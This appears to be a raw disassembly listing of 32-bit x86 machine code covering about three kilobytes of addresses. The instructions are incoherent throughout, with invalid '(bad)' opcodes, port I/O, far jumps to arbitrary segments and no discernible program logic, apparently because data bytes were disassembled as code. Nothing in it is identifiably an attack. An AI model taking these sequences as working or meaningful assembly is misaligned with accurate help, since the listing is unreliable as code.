  4239c3:	sbb    ebp,ecx
  4239c5:	jnp    0x4239c8
  4239c7:	add    ch,dh
  4239c9:	add    BYTE PTR [eax],al
  4239cb:	add    al,dl
  4239cd:	out    dx,al
  4239ce:	test   BYTE PTR [ebp+0x46],0x5e
  4239d2:	adc    al,0x9
  4239d4:	add    al,0x3
  4239d6:	clc    
  4239d7:	cmp    eax,0x6755ca5
  4239dc:	aad    0x3f
  4239de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239df:	(bad)  
  4239e0:	js     0x423a0d
  4239e2:	mov    dh,BYTE PTR [eax+0x3b]
  4239e5:	pop    ecx
  4239e6:	imul   DWORD PTR [edi-0x77b6b0b3]
  4239ec:	push   ebx
  4239ed:	je     0x423a69
  4239ef:	add    ecx,ecx
  4239f1:	sub    DWORD PTR [ebp-0x4],esi
  4239f4:	repz fist WORD PTR [ebx]
  4239f7:	pop    es
  4239f8:	jle    0x423986
  4239fa:	cwde   
  4239fb:	pop    ecx
  4239fc:	jns    0x423a02
  4239fe:	ror    BYTE PTR [edx-0x46f6b9a2],0x15
  423a05:	xlat   BYTE PTR ds:[ebx]
  423a06:	sub    eax,0x27504c49
  423a0b:	out    0x88,eax
  423a0d:	sbb    BYTE PTR [ebx-0x64],ah
  423a10:	or     al,0xbc
  423a12:	mov    ds:0x6b71feb1,al
  423a17:	dec    ebx
  423a18:	sub    al,0x54
  423a1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a1b:	mov    ah,0x27
  423a1d:	mov    dl,0xaa
  423a1f:	fisttp WORD PTR [ecx+0x4f430f5e]
  423a25:	cdq    
  423a26:	mov    BYTE PTR [ecx+eiz*1+0x55346e60],cl
  423a2d:	out    0x18,eax
  423a2f:	faddp  st(0),st
  423a31:	xlat   BYTE PTR ds:[ebx]
  423a32:	lock adc BYTE PTR [edx],cl
  423a35:	mov    BYTE PTR [eax],ah
  423a37:	xchg   ecx,eax
  423a38:	rcl    DWORD PTR [edi],1
  423a3a:	mov    ecx,edi
  423a3c:	stos   BYTE PTR es:[edi],al
  423a3d:	jge    0x423a8e
  423a3f:	in     al,0x7c
  423a41:	mov    cl,0xbe
  423a43:	lods   eax,DWORD PTR ds:[esi]
  423a44:	outs   dx,BYTE PTR ds:[esi]
  423a45:	idiv   DWORD PTR [eax+0x11]
  423a48:	ss sub DWORD PTR gs:[eax],ebp
  423a4c:	call   0xae1c:0x207d89cb
  423a53:	nop
  423a54:	or     eax,0xe6f08761
  423a59:	push   ss
  423a5a:	xchg   BYTE PTR [ecx+0xc6270e3],dh
  423a60:	dec    ecx
  423a61:	popa   
  423a62:	js     0x423abf
  423a64:	and    eax,0x5b2ea5f8
  423a69:	jno    0x423aad
  423a6b:	pop    esi
  423a6c:	popf   
  423a6d:	pop    ebx
  423a6e:	dec    edi
  423a6f:	or     BYTE PTR [edx+0x663055ee],0x65
  423a76:	fsubr  DWORD PTR ds:0x3d2df7a7
  423a7c:	fiadd  DWORD PTR [edx]
  423a7e:	jmp    0x423a08
  423a80:	sahf   
  423a81:	or     bh,BYTE PTR [esi+0x6f]
  423a84:	ss push edi
  423a86:	and    eax,0x8e0bafb
  423a8b:	ds pop eax
  423a8d:	mov    cl,0x57
  423a8f:	sub    DWORD PTR [esi-0x458ea9ac],ecx
  423a95:	fld    DWORD PTR [edx+0x29cec83b]
  423a9b:	retf   
  423a9c:	pop    ecx
  423a9d:	in     eax,0x29
  423a9f:	xor    al,0x1
  423aa1:	int3   
  423aa2:	mov    ebx,0x1b800e45
  423aa7:	mov    esp,DWORD PTR [edi+0x9]
  423aaa:	jns    0x423a3b
  423aac:	xor    ch,BYTE PTR [ebx+0x148e7ccb]
  423ab2:	(bad)
  423ab6:	xlat   BYTE PTR ds:[ebx]
  423ab7:	mov    cl,0x8c
  423ab9:	shl    BYTE PTR [edi],0xbf
  423abc:	mov    ch,0xa4
  423abe:	test   ebx,0x9b
	...
  423b34:	inc    esp
  423b35:	aaa    
  423b36:	dec    edx
  423b37:	fwait
  423b38:	jnp    0x423b39
  423b3a:	aad    0xff
  423b3c:	gs popa 
  423b3e:	into   
  423b3f:	add    al,0xcc
  423b41:	cwde   
  423b42:	mov    ds:0x17cc2e2,eax
  423b47:	add    ch,dh
  423b49:	add    BYTE PTR [eax],al
  423b4b:	add    BYTE PTR [edx],bl
  423b4d:	pushf  
  423b4e:	in     al,dx
  423b4f:	add    eax,0xd31d6af7
  423b54:	aaa    
  423b55:	jno    0x423ba3
  423b57:	pop    esp
  423b58:	test   eax,0xe5393f70
  423b5d:	jecxz  0x423b47
  423b5f:	dec    edx
  423b60:	fsubr  DWORD PTR [edi+0x5429fa3]
  423b66:	mov    eax,ds:0x487ccdd0
  423b6b:	and    esi,DWORD PTR [eax]
  423b6d:	das    
  423b6e:	push   ss
  423b6f:	sbb    ecx,DWORD PTR [edx+0x6bad616c]
  423b75:	ja     0x423aff
  423b77:	xor    edx,DWORD PTR [ebx-0x1eca7273]
  423b7d:	js     0x423b2d
  423b7f:	push   ecx
  423b80:	xchg   ebx,eax
  423b81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b82:	fs pusha 
  423b84:	or     eax,0xc433cc47
  423b89:	dec    edx
  423b8a:	add    bl,BYTE PTR [ecx-0x4af3205d]
  423b90:	jo     0x423bb9
  423b92:	jne    0x423b9f
  423b94:	sub    dh,BYTE PTR [edx+0x71bd9f50]
  423b9a:	cld    
  423b9b:	adc    BYTE PTR [edi+0x2fbd8d13],bh
  423ba1:	jmp    0x423b28
  423ba3:	cmp    al,bl
  423ba5:	ins    BYTE PTR es:[edi],dx
  423ba6:	push   ebx
  423ba7:	aaa    
  423ba8:	sbb    al,0xa4
  423baa:	neg    DWORD PTR [ecx+0x28]
  423bad:	fs mov cl,0xfe
  423bb0:	jo     0x423b87
  423bb2:	xchg   eax,eax
  423bb4:	mov    WORD PTR [ebx+0x4d],es
  423bb7:	push   0xffffffe3
  423bb9:	cdq    
  423bba:	test   eax,0xa10d791c
  423bbf:	sub    BYTE PTR [eax],dl
  423bc1:	add    BYTE PTR [ebx+0x28],dh
  423bc4:	retf   0x72f5
  423bc7:	jae    0x423b64
  423bc9:	cwde   
  423bca:	xor    DWORD PTR [edx-0x3d],esp
  423bcd:	cmp    DWORD PTR [esi+0x4696a07a],esp
  423bd3:	push   ebx
  423bd4:	call   0x655bfb8c
  423bd9:	mov    ah,0xa6
  423bdb:	not    ah
  423bdd:	loop   0x423c02
  423bdf:	xor    BYTE PTR [ecx+0x43e34d03],cl
  423be5:	mov    esp,DWORD PTR [ecx-0x670895de]
  423beb:	les    esp,FWORD PTR [ebx]
  423bed:	pop    es
  423bee:	hlt    
  423bef:	fcomp  DWORD PTR [ebx+0xe]
  423bf2:	mov    ds:0x6e70cc0b,al
  423bf7:	sub    edx,DWORD PTR [ebx-0x2c3331c5]
  423bfd:	aam    0xa7
  423bff:	lea    ecx,[ecx]
  423c01:	mov    eax,ds:0x88b27591
  423c06:	sbb    edi,DWORD PTR [edx+0x77]
  423c09:	out    dx,eax
  423c0a:	mov    ebp,0x7c3e8af2
  423c0f:	jg     0x423c29
  423c11:	adc    edx,DWORD PTR [ebx]
  423c13:	push   cs
  423c14:	aam    0xb
  423c16:	jle    0x423bce
  423c18:	pop    es
  423c19:	push   0xfffffff2
  423c1b:	hlt    
  423c1c:	add    esp,eax
  423c1e:	dec    edi
  423c1f:	cmp    dh,dl
  423c21:	xchg   edi,eax
  423c22:	out    0x73,eax
  423c24:	jbe    0x423bb8
  423c26:	call   0x5b7b:0x8aa05edc
  423c2d:	or     DWORD PTR [ebp+0x4881894a],eax
  423c33:	sub    al,BYTE PTR [ebp-0x3a9b1352]
  423c39:	adc    bl,BYTE PTR [ebx-0x18472926]
  423c3f:	push   ebx
  423c40:	repnz add BYTE PTR [eax],al
	...
  423cb3:	add    BYTE PTR [edi+0x626d60bd],bh
  423cb9:	std    
  423cba:	mov    edi,0x703576ff
  423cbf:	enter  0xd879,0x8e
  423cc3:	sub    esi,DWORD PTR [edi-0xafffe83]
  423cc9:	add    BYTE PTR [eax],al
  423ccb:	add    BYTE PTR [esi],ah
  423ccd:	ds iret 
  423ccf:	add    ah,BYTE PTR [edx+esi*8-0x23]
  423cd3:	pop    esi
  423cd4:	sbb    eax,0x2016d762
  423cd9:	in     eax,0x4a
  423cdb:	sbb    eax,0x91f4557f
  423ce0:	das    
  423ce1:	(bad)  
  423ce2:	in     eax,dx
  423ce3:	cld    
  423ce4:	lock popf 
  423ce6:	mov    eax,0x884c47f0
  423ceb:	push   cs
  423cec:	fwait
  423ced:	call   0xb48a:0xf08174d3
  423cf4:	outs   dx,DWORD PTR es:[esi]
  423cf6:	add    dl,bh
  423cf8:	inc    edi
  423cf9:	js     0x423c95
  423cfb:	push   es
  423cfc:	or     DWORD PTR [edi+0x59],ebp
  423cff:	pop    ss
  423d00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d01:	mov    ss,WORD PTR ds:0x3f81bb4d
  423d07:	add    ah,BYTE PTR [edi+0x18]
  423d0a:	bound  eax,QWORD PTR [ebx]
  423d0c:	rcr    BYTE PTR ds:0x8f59fd2f,1
  423d12:	and    ecx,DWORD PTR ds:0x2df9ac3f
  423d18:	sar    BYTE PTR [ebx-0x7fc3495b],0x20
  423d1f:	and    al,0x14
  423d21:	or     BYTE PTR [ebp-0x600c1b13],ah
  423d27:	or     al,BYTE PTR [edx]
  423d29:	fwait
  423d2a:	pop    ds
  423d2b:	inc    esp
  423d2c:	add    BYTE PTR [ebx+0x59ee3f4a],dl
  423d32:	enter  0x7749,0xe8
  423d36:	jl     0x423cda
  423d38:	jae    0x423d0f
  423d3a:	popf   
  423d3b:	aaa    
  423d3c:	ss stos DWORD PTR es:[edi],eax
  423d3e:	jmp    0x1fab:0x9aa9f978
  423d45:	jle    0x423d95
  423d47:	sbb    al,0x80
  423d49:	or     ebx,DWORD PTR [ebx]
  423d4b:	fbld   TBYTE PTR [ebp-0xa6f68dc]
  423d51:	lods   al,BYTE PTR ds:[esi]
  423d52:	(bad)  
  423d54:	je     0x423cda
  423d56:	hlt    
  423d57:	ins    BYTE PTR es:[edi],dx
  423d58:	mov    esi,0x82f452e4
  423d5d:	stos   BYTE PTR es:[edi],al
  423d5e:	jns    0x423d53
  423d60:	ret    
  423d61:	test   al,0x64
  423d63:	icebp  
  423d64:	xor    eax,0xcf93fee8
  423d69:	sti    
  423d6a:	mov    dh,0x95
  423d6c:	sar    ah,cl
  423d6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423d6f:	add    eax,0x4e2e7c79
  423d74:	push   esi
  423d75:	repz lds edx,FWORD PTR [eax-0x2d3102e1]
  423d7c:	pop    ebx
  423d7d:	xchg   BYTE PTR [esp+esi*4],dh
  423d80:	enter  0xeb44,0x35
  423d84:	dec    edx
  423d85:	pop    edi
  423d86:	bound  ecx,QWORD PTR [ecx-0x6b]
  423d89:	sti    
  423d8a:	fst    QWORD PTR [edi-0x16]
  423d8d:	push   ebp
  423d8e:	jp     0x423d2f
  423d90:	or     eax,0x5506f95e
  423d95:	(bad)  
  423d96:	jle    0x423da5
  423d98:	ficomp WORD PTR [edi+0x1dae2851]
  423d9e:	push   ecx
  423d9f:	mov    bh,0x99
  423da1:	pop    esi
  423da2:	push   cs
  423da3:	pusha  
  423da4:	rcl    DWORD PTR [eax-0x57f058b5],1
  423daa:	rol    BYTE PTR ds:0xbfddd47b,0x58
  423db1:	pop    esp
  423db2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423db3:	in     eax,dx
  423db4:	les    ebx,FWORD PTR [eax+0x44f3bf29]
  423dba:	mov    al,ds:0x75ea835e
  423dbf:	jl     0x423d4e
	...
  423e31:	add    BYTE PTR [eax],al
  423e33:	add    BYTE PTR [ebx-0x21e677ab],al
  423e39:	fst    QWORD PTR [ebx+0x6b48c6df]
  423e3f:	out    dx,eax
  423e40:	jne    0x7eeed926
  423e46:	add    DWORD PTR [eax],eax
  423e48:	cmc    
  423e49:	add    BYTE PTR [eax],al
  423e4b:	add    BYTE PTR [edx],bh
  423e4d:	mov    al,ds:0x643fe755
  423e52:	jae    0x423e08
  423e54:	aam    0x88
  423e56:	lock xor DWORD PTR [eax-0x24],ecx
  423e5a:	cmp    edi,DWORD PTR [ebp+0x79dcaaa0]
  423e60:	stos   BYTE PTR es:[edi],al
  423e61:	das    
  423e62:	cmp    edx,DWORD PTR [esi+0x63]
  423e65:	and    BYTE PTR [edi+esi*8-0x51],0xaf
  423e6a:	in     al,0x4d
  423e6c:	rcl    DWORD PTR [edi+0xbceb3b2],cl
  423e72:	mov    ecx,0x599e3717
  423e77:	push   edi
  423e78:	cld    
  423e79:	dec    ebp
  423e7a:	dec    ebx
  423e7b:	push   ds
  423e7c:	cmc    
  423e7d:	lods   eax,DWORD PTR ds:[esi]
  423e7e:	push   es
  423e7f:	test   eax,0x1d89ec32
  423e84:	imul   edx,esi,0xc8e8e3a4
  423e8a:	sar    BYTE PTR [esi+ebx*2],1
  423e8d:	ret    0x8704
  423e90:	mov    edi,0x851f6d3c
  423e95:	mov    ebp,0x7ded2cc9
  423e9a:	and    bl,BYTE PTR [ecx+esi*8-0x563f8757]
  423ea1:	mov    eax,ds:0xb3deeda5
  423ea6:	in     al,dx
  423ea7:	pop    eax
  423ea8:	pop    edi
  423ea9:	xor    al,0xe2
  423eab:	mov    ah,0x7a
  423ead:	jne    0x423e89
  423eaf:	jae    0x423e6a
  423eb1:	jg     0x423e8e
  423eb3:	mov    dh,BYTE PTR ds:0x33c4720a
  423eb9:	arpl   di,di
  423ebb:	jle    0x423e54
  423ebd:	pop    ds
  423ebe:	dec    ebp
  423ebf:	adc    DWORD PTR [esi],0x3a
  423ec2:	jmp    0x423e8a
  423ec4:	(bad)  
  423ec5:	icebp  
  423ec6:	mov    bl,0x88
  423ec8:	sar    BYTE PTR [ecx],cl
  423eca:	ins    BYTE PTR es:[edi],dx
  423ecb:	mov    ebp,0x4917ace8
  423ed0:	outs   dx,WORD PTR ds:[esi]
  423ed2:	leave  
  423ed3:	sbb    edx,DWORD PTR [edi+0x48]
  423ed6:	test   al,0x1c
  423ed8:	dec    BYTE PTR [edi+0x7f]
  423edb:	fisubr WORD PTR [ebx*2+0x79287b26]
  423ee2:	aas    
  423ee3:	add    ecx,DWORD PTR [eax-0x66f7bf8a]
  423ee9:	adc    cl,0xdc
  423eec:	int3   
  423eed:	jb     0x423f47
  423eef:	aam    0x7e
  423ef1:	fsubr  st(3),st
  423ef3:	mov    ecx,0x1015a307
  423ef8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423ef9:	mov    ch,dh
  423efb:	xchg   ebx,eax
  423efc:	inc    BYTE PTR [edi+0x1f044d94]
  423f02:	popf   
  423f03:	mov    cl,0xf4
  423f05:	out    0xcd,al
  423f07:	adc    al,0x18
  423f09:	je     0x423f7f
  423f0b:	inc    esi
  423f0c:	das    
  423f0d:	inc    eax
  423f0e:	popa   
  423f0f:	mov    ebx,0x5ebe60b2
  423f14:	in     al,dx
  423f15:	and    bl,al
  423f17:	xor    ebx,edi
  423f19:	push   ecx
  423f1a:	shl    BYTE PTR [ebx],1
  423f1c:	or     dl,BYTE PTR [ebp-0x35]
  423f1f:	rcl    BYTE PTR [edi+eax*1+0x12262516],0xf6
  423f27:	inc    ebp
  423f28:	push   0x7a
  423f2a:	or     eax,DWORD PTR [esi+0x11]
  423f2d:	pop    ds
  423f2e:	lock je 0x423ec1
  423f31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423f32:	rcl    BYTE PTR ds:0xf8caa845,0x52
  423f39:	in     al,0x27
  423f3b:	outs   dx,BYTE PTR ds:[esi]
  423f3c:	xchg   ebx,eax
  423f3d:	push   ebx
  423f3e:	xor    al,0x78
  423f40:	and    BYTE PTR [eax],al
	...
  423fb2:	add    BYTE PTR [eax],al
  423fb4:	inc    esi
  423fb5:	in     al,0x62
  423fb7:	mov    dl,ah
  423fb9:	mov    gs,esi
  423fbb:	out    dx,al
  423fbc:	in     al,dx
  423fbd:	pop    ebx
  423fbe:	test   BYTE PTR [edx+0x29],dh
  423fc1:	call   0x1:0x7fa10c6b
  423fc8:	cmc    
  423fc9:	add    BYTE PTR [eax],al
  423fcb:	add    dh,bl
  423fcd:	xor    al,0xad
  423fcf:	xlat   BYTE PTR ds:[ebx]
  423fd0:	xor    DWORD PTR [edi+0x2a],ebp
  423fd3:	fwait
  423fd4:	es sahf 
  423fd6:	inc    ebx
  423fd7:	les    edx,FWORD PTR [edi-0x3b]
  423fda:	and    al,BYTE PTR [ebp-0x1]
  423fdd:	mov    esi,0x698fc9e3
  423fe2:	pushf  
  423fe3:	mov    ds:0x691d8b86,eax
  423fe8:	sar    edx,cl
  423fea:	in     eax,dx
  423feb:	push   es
  423fec:	loope  0x423fb1
  423fee:	dec    DWORD PTR [ecx]
  423ff0:	adc    cl,BYTE PTR [edi]
  423ff2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ff3:	loopne 0x42405d
  423ff5:	sub    BYTE PTR [edx],bl
  423ff7:	pop    es
  423ff8:	jle    0x423ff9
  423ffa:	sub    bl,BYTE PTR [edi]
  423ffc:	loop   0x423fc1
  423ffe:	pop    edi
  423fff:	and    ecx,DWORD PTR [ebx-0x15]
  424002:	cmp    DWORD PTR [edi+0x3e],ecx
  424005:	in     al,dx
  424006:	push   edx
  424007:	pop    es
  424008:	jbe    0x423fab
  42400a:	call   0xcc7b08f5
  42400f:	(bad)  
  424010:	xchg   ecx,eax
  424011:	and    dh,dh
  424013:	pop    ebp
  424014:	dec    ecx
  424015:	jb     0x423ff8
  424017:	xchg   edi,eax
  424018:	(bad)  
  424019:	rcr    BYTE PTR [eax-0x76],cl
  42401c:	retf   0x1f83
  42401f:	scas   al,BYTE PTR es:[edi]
  424020:	popa   
  424021:	retf   0x2d7f
  424024:	sub    bh,BYTE PTR [ebx+esi*2-0x50]
  424028:	retf   
  424029:	adc    ch,cl
  42402b:	iret   
  42402c:	cli    
  42402d:	movaps XMMWORD PTR [ebx-0xa],xmm6
  424031:	aas    
  424032:	ds in  al,0x56
  424035:	inc    esi
  424036:	xor    al,0xc8
  424038:	jnp    0x423fdc
  42403a:	sub    ebx,DWORD PTR [ecx]
  42403c:	(bad)  
  42403d:	cld    
  42403e:	test   BYTE PTR [ebx+0x20],cl
  424041:	repnz mov ?,ecx
  424044:	cli    
  424045:	dec    ebp
  424046:	add    DWORD PTR [ecx+0x2baff3b6],esp
  42404c:	test   BYTE PTR [ecx],ch
  42404e:	loop   0x424055
  424050:	xor    DWORD PTR [edi],0xffffffd0
  424053:	mov    al,ds:0x6da15773
  424058:	xchg   ebx,eax
  424059:	pop    ecx
  42405a:	mov    ebp,0x3c22a901
  42405f:	hlt    
  424060:	dec    ecx
  424061:	dec    ebx
  424062:	imul   ebp,DWORD PTR [ecx+0x2d],0xe2838ff6
  424069:	fs jge 0x42404b
  42406c:	nop
  42406d:	addr16 aas 
  42406f:	jmp    0x5be4664c
  424074:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424075:	xor    DWORD PTR [ebx-0xf419319],ecx
  42407b:	in     al,0xdb
  42407d:	add    bh,bl
  42407f:	mov    eax,0xf33ed4e1
  424084:	and    ebx,DWORD PTR [edi-0x6f]
  424087:	push   esi
  424088:	xchg   BYTE PTR [ebp+0x7d],cl
  42408b:	jo     0x42403e
  42408d:	inc    esi
  42408e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42408f:	mov    edx,0xca7223e5
  424094:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424095:	fldenv [esi]
  424097:	xchg   DWORD PTR [edx+esi*4],ecx
  42409a:	jmp    0x4240dc
  42409c:	sub    bh,BYTE PTR [eax-0x66c79198]
  4240a2:	call   0x4f84:0xa1e184e7
  4240a9:	jne    0x424095
  4240ab:	mov    ds:0x9386f711,eax
  4240b0:	cli    
  4240b1:	es aas 
  4240b3:	(bad)  
  4240b4:	mov    bl,0xec
  4240b6:	mov    esi,0x44e82fa6
  4240bb:	nop
  4240bc:	mov    WORD PTR ds:0x32f02f,?
	...
  424132:	add    BYTE PTR [eax],al
  424134:	jns    0x424127
  424136:	div    DWORD PTR [ecx-0x6804801]
  42413c:	bound  esi,QWORD PTR [eax-0x799c8496]
  424142:	fwait
  424143:	jmp    0xf5:0x18096
  42414a:	add    BYTE PTR [eax],al
  42414c:	pop    edi
  42414d:	jnp    0x4240dc
  42414f:	cwde   
  424150:	push   esi
  424151:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424152:	cmc    
  424153:	js     0x42415c
  424155:	mov    cl,0xf8
  424157:	and    eax,0xe97d820c
  42415c:	jmp    0x42411c
  42415e:	cmp    eax,0xb163b2f3
  424163:	push   ebp
  424164:	fmul   QWORD PTR [edx+0x477940c0]
  42416a:	inc    eax
  42416b:	jo     0x424124
  42416d:	push   edx
  42416e:	rcr    BYTE PTR [esi-0x370a2c79],1
  424174:	fidiv  WORD PTR [edi+0x3e]
  424177:	inc    ebx
  424178:	xchg   BYTE PTR [esi+ecx*2-0x4d],al
  42417c:	xor    al,0x7
  42417e:	dec    ebp
  42417f:	mov    ecx,0x36cada44
  424184:	and    ebx,DWORD PTR [ecx-0x41afa14c]
  42418a:	outs   dx,BYTE PTR ds:[esi]
  42418b:	adc    ch,ch
  42418d:	addr16 in al,dx
  42418f:	imul   edi,DWORD PTR [ebx-0x26],0x978587d5
  424196:	imul   eax,DWORD PTR [bp+si-0x61],0x39
  42419b:	dec    ebp
  42419c:	jp     0x42419a
  42419e:	imul   ebp,ebx,0x74
  4241a1:	xchg   eax,edi
  4241a3:	pop    eax
  4241a4:	iret   
  4241a5:	aad    0x9a
  4241a7:	push   es
  4241a8:	test   DWORD PTR [ecx+eiz*2],ebp
  4241ab:	cmp    al,0x13
  4241ad:	div    al
  4241af:	or     dl,BYTE PTR [ecx+ebp*8]
  4241b2:	outs   dx,BYTE PTR ds:[esi]
  4241b3:	mov    BYTE PTR [eax],bh
  4241b5:	jo     0x424150
  4241b7:	add    eax,0xf98d7c98
  4241bc:	pop    ds
  4241bd:	pop    eax
  4241be:	fwait
  4241bf:	dec    ebp
  4241c0:	and    BYTE PTR [esi+0x68],bl
  4241c3:	xor    BYTE PTR [edi+0x74ed8921],al
  4241c9:	sbb    eax,0x3478c482
  4241ce:	pop    ebx
  4241cf:	cmp    esp,DWORD PTR [ebx-0x7fc2e251]
  4241d5:	and    cl,BYTE PTR [edx-0x62893812]
  4241db:	cld    
  4241dc:	jecxz  0x424245
  4241de:	xchg   ebp,eax
  4241e0:	xchg   ebp,eax
  4241e1:	fcom   st(4)
  4241e3:	js     0x4241e0
  4241e5:	test   BYTE PTR [edi+eax*4],al
  4241e8:	lds    eax,FWORD PTR [esi-0x2f]
  4241eb:	outs   dx,BYTE PTR ds:[esi]
  4241ec:	(bad)  
  4241ed:	cdq    
  4241ee:	and    BYTE PTR [ecx-0xed14e5e],dl
  4241f4:	mov    ds:0x6413513f,eax
  4241f9:	xor    DWORD PTR [ecx+0x297450e2],esi
  4241ff:	repnz push esi
  424201:	jae    0x424198
  424203:	push   ds
  424204:	aam    0x43
  424206:	popf   
  424207:	ja     0x42421d
  424209:	fsub   QWORD PTR [edx-0x3c]
  42420c:	push   cs
  42420d:	shl    BYTE PTR [edi],1
  42420f:	aaa    
  424210:	xchg   ebp,eax
  424211:	push   eax
  424212:	add    BYTE PTR [esi+0x29f74cde],ah
  424218:	sti    
  424219:	pop    ds
  42421a:	cmp    eax,0x3559b830
  42421f:	test   ebp,edx
  424221:	add    ch,bl
  424223:	gs adc eax,0xf4bd083d
  424229:	lds    ebx,FWORD PTR [ebx+0x7cd0edb0]
  42422f:	jne    0x4241b2
  424231:	cdq    
  424232:	jg     0x4241f6
  424234:	mov    bh,0xbd
  424236:	mov    ds:0x520abaaf,al
  42423b:	retf   
  42423c:	add    eax,0xd53376ea
	...
  4242b1:	add    BYTE PTR [eax],al
  4242b3:	add    al,bh
  4242b5:	fisub  WORD PTR [edx+0x30]
  4242b8:	mov    sp,0xdefa
  4242bc:	push   ss
  4242bd:	mov    ds:0x784fa4bf,eax
  4242c2:	and    esp,DWORD PTR [eax+0x1818b]
  4242c8:	cmc    
  4242c9:	add    BYTE PTR [eax],al
  4242cb:	add    BYTE PTR [ebx+0x44],bh
  4242ce:	sbb    ebp,esi
  4242d0:	push   ss
  4242d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4242d2:	push   ecx
  4242d3:	rol    esp,cl
  4242d5:	sbb    esi,DWORD PTR [bx+di+0x7f9d]
  4242da:	mov    cl,0x19
  4242dc:	lea    ebp,[esi+0xf6a6633]
  4242e2:	inc    eax
  4242e3:	daa    
  4242e4:	xlat   BYTE PTR ds:[ebx]
  4242e5:	xchg   esi,eax
  4242e6:	inc    ebx
  4242e7:	xor    ax,0x78db
  4242eb:	jbe    0x424358
  4242ed:	retf   
  4242ee:	sub    edi,DWORD PTR [ebx-0x36e5598a]
  4242f4:	inc    ecx
  4242f5:	push   es
  4242f6:	jb     0x424301
  4242f8:	xlat   BYTE PTR ds:[ebx]
  4242f9:	add    DWORD PTR [ebx+0x38e2646c],esp
  4242ff:	enter  0xc5ad,0xde
  424303:	mov    edi,0x29937bff
  424308:	mov    DWORD PTR [ebp+edi*4+0x73],0xc2453306
  424310:	mov    WORD PTR [edx+0x35f95ae8],ss
  424316:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424317:	cmp    eax,0x4e172d13
  42431c:	ss repnz adc al,0xbc
  424320:	mov    ds:0x207ff9e3,al
  424325:	mov    dh,0xc0
  424327:	lods   eax,DWORD PTR ds:[esi]
  424328:	scas   al,BYTE PTR es:[edi]
  424329:	pop    ds
  42432a:	push   es
  42432b:	and    DWORD PTR gs:[ebx+ecx*2],ecx
  42432f:	dec    esi
  424330:	fist   DWORD PTR [esi+0x65]
  424333:	pop    ds
  424334:	xchg   ebp,eax
  424335:	pop    edi
  424336:	addr16 pop ebp
  424338:	fst    QWORD PTR [ebx-0x2d]
  42433b:	xchg   esi,eax
  42433c:	gs test al,0x71
  42433f:	inc    edx
  424340:	pop    edi
  424341:	loopne 0x424313
  424343:	lds    ebx,FWORD PTR [esi-0x148448cf]
  424349:	rcr    BYTE PTR [esp+ebx*4+0x7e8e8f0e],cl
  424350:	call   0x56b681f5
  424355:	mov    edx,0xeb4e957b
  42435a:	add    BYTE PTR [ecx],al
  42435c:	dec    ebx
  42435d:	inc    eax
  42435e:	sub    BYTE PTR [esi+0x46],bh
  424361:	pop    esi
  424362:	je     0x4243a6
  424364:	arpl   WORD PTR [edx],sp
  424366:	or     dl,al
  424368:	xor    esp,0xffffffe3
  42436b:	(bad)  
  42436c:	dec    ebx
  42436e:	popa   
  42436f:	sti    
  424370:	sub    eax,0x5506abc5
  424375:	les    eax,FWORD PTR ds:0x8173ec7b
  42437b:	xchg   ebx,eax
  42437c:	outs   dx,DWORD PTR ds:[esi]
  42437d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42437e:	inc    edx
  42437f:	test   al,0x17
  424381:	(bad)  
  424382:	mov    ch,BYTE PTR [ebx+eax*1+0x70d0bddd]
  424389:	mov    bl,0xe1
  42438b:	out    0xa8,al
  42438d:	push   eax
  42438e:	jmp    0x42432b
  424390:	cwde   
  424391:	sub    eax,0xb76d117d
  424396:	out    0x42,eax
  424398:	push   ebp
  424399:	mov    WORD PTR ds:0xf9c14a16,?
  42439f:	and    eax,0xaf349bcb
  4243a4:	inc    eax
  4243a5:	daa    
  4243a6:	mov    ah,0x8b
  4243a8:	inc    edx
  4243a9:	or     eax,0x63065e86
  4243ae:	mov    ds:0xf046e577,eax
  4243b3:	mov    DWORD PTR [eax*1-0x6423a6c7],ebx
  4243ba:	addr16 sbb eax,0xb3bd88ba
  4243c0:	sahf   
	...
  424431:	add    BYTE PTR [eax],al
  424433:	add    al,al
  424435:	mov    al,0x45
  424437:	outs   dx,DWORD PTR ds:[esi]
  424438:	jne    0x424439
  42443a:	jmp    0x7dd2:0x8abb70bf
  424441:	aaa    
  424442:	mov    WORD PTR [ebx],ss
  424444:	add    BYTE PTR [edx+0xf50001],0x0
  42444b:	add    BYTE PTR [eax],ch
  42444d:	div    BYTE PTR [esi-0x2a12137c]
  424453:	(bad)  
  424454:	pop    esi
  424455:	xchg   ebx,eax
  424456:	cdq    
  424457:	mov    al,ds:0x8ad9d48c
  42445c:	jl     0x42440f
  42445e:	pop    esi
  42445f:	loopne 0x4244b2
  424461:	sbb    DWORD PTR [edx],edx
  424463:	and    cl,BYTE PTR [ebx-0x28]
  424466:	mov    ds:0x70281f86,eax
  42446b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42446c:	ins    DWORD PTR es:[edi],dx
  42446d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42446e:	sub    eax,DWORD PTR [esi+0xf]
  424471:	xchg   edi,eax
  424472:	mov    ds:0xd489ed49,al
  424477:	mov    cl,0x12
  424479:	mov    ds:0xde4a0dfb,eax
  42447e:	xor    esp,edi
  424480:	pop    edi
  424481:	ror    BYTE PTR [ecx],0x45
  424484:	xor    dl,BYTE PTR [esi]
  424486:	popf   
  424487:	repnz xchg edi,eax
  424489:	cmp    al,0xa7
  42448b:	and    DWORD PTR [ebp+0x552a63b8],eax
  424491:	jns    0x424477
  424493:	dec    ecx
  424494:	lahf   
  424495:	test   esi,ebx
  424497:	in     eax,dx
  424498:	pop    edi
  424499:	jg     0x4244d0
